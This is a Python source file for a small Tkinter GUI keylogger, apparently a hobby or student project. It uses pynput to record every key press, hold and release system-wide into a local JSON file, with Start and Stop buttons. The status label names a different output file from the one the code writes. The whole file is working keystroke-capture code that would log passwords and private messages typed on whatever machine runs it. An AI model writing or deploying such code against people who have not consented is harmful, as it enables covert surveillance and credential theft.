import tkinter as tk
from tkinter import *
from pynput import keyboard
import json

# Global variables
keys_used = []
flag = False
output_file = 'sundhar key_log.json'

# Function to generate log files
def generate_log(data, file_path):
    with open(file_path, 'w') as file:
        json.dump(data, file)

# Function called when a key is pressed
def on_press(key):
    global flag, keys_used
    if flag == False:
        keys_used.append({'Pressed': str(key)})
        flag = True
    else:
        keys_used.append({'Held': str(key)})
    generate_log(keys_used, output_file)

# Function called when a key is released
def on_release(key):
    global flag, keys_used
    keys_used.append({'Released': str(key)})
    if flag == True:
        flag = False
    generate_log(keys_used, output_file)

# Function to start the keylogger
def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'keylogger.json'")
    start_button.config(state='disabled')
    stop_button.config(state='normal')

# Function to stop the keylogger
def stop_keylogger():
    global listener
    listener.stop()
    label.config(text="Keylogger stopped.")
    start_button.config(state='normal')
    stop_button.config(state='disabled')

# GUI setup
root = Tk()
root.title("Keylogger")

label = Label(root, text='Click "Start" to begin keylogging.')
label.config(anchor=CENTER)
label.pack()

start_button = Button(root, text="Start", command=start_keylogger)
start_button.pack(side=LEFT)

stop_button = Button(root, text="Stop", command=stop_keylogger, state='disabled')
stop_button.pack(side=RIGHT)

root.geometry("250x150")
root.mainloop()
